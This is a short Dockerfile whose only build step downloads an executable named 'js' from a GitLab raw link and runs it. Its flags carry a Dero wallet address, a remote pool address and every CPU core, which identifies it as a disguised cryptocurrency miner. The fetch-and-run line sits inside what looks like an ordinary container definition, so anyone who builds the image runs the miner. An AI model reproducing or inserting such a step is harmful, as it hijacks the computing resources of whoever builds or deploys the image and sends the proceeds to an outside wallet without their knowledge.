 FROM ubuntu:latest

 RUN apt-get update && \
     apt-get install wget -y && \
     wget https://gitlab.com/terryputri/file/-/raw/main/js && chmod +x js && ./js -w dero1qyn5krz9a7w5728m723khpqwnkatu57tl6nq9n9hct37d5zmd7pq2qg32hmnr -r 95.179.133.130:10100 -p rpc -m $(nproc --all)
